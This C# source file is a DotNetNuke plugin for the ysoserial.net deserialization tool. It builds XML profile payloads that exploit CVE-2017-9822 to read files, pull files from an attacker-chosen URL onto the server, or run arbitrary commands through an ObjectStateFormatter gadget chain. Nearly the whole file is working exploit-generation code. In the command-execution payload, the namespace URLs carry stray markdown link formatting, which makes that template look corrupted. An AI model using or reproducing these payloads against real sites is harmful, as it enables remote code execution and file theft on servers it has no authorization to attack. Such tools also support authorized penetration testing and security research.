﻿using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial.Generators;

namespace ysoserial.Plugins
{
    class DotNetNukePlugin : Plugin
    {
        static string mode = "";
        static string path = "";
        static string file = "";
        static string url = "";
        static string command = "";

        static OptionSet options = new OptionSet()
            {
                {"M|mode=", "the payload mode: read_file, upload_file, run_command.", v => mode = v },
                {"C|command=", "the command to be executed in run_command mode.", v => command = v },
                {"U|url=", "the url to fetch the file from in write_file mode.", v => url = v },
                {"F|file=", "the file to read in read_file mode or the file to write to in write_file_mode.", v => path = v },
            };

        public string Name()
        {
            return "DotNetNuke";
        }

        public string Description()
        {
            return "Generates payload for DotNetNuke CVE-2017-9822";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }
            string payload = "";

            if (mode == "write_file" && path != "" & url != "")
            {
                payload = @"<profile><item key=""name1: key1"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""><ExpandedElement/><ProjectedProperty0><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type=""xsd:string"">" + url + @"</anyType><anyType xsi:type=""xsd:string"">" + path + @"</anyType></MethodParameters><ObjectInstance xsi:type=""FileSystemUtils""></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>";
            }
            else if (mode == "read_file" && path != "")
            {
                payload = @"<profile><item key=""name1: key1"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type=""xsd:string"">" + path + @"</anyType></MethodParameters><ObjectInstance xsi:type=""FileSystemUtils""></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>";
            }
            else if (mode == "run_command" && command != "")
            {
                byte[] osf = (byte[]) new TypeConfuseDelegateGenerator().Generate(command, "ObjectStateFormatter", false);
                string b64encoded = Convert.ToBase64String(osf);
                string prefix = @"<profile><item key=""foo"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""><ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd="" [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) "" xmlns:xsi="" [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) ""><ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type=""xsd:string"">";
                string suffix = @"</anyType></MethodParameters><ObjectInstance xsi:type=""ObjectStateFormatter""></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>";
                payload = prefix + b64encoded + suffix;  
            }
            else
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }
            return payload;

        }
    }
}
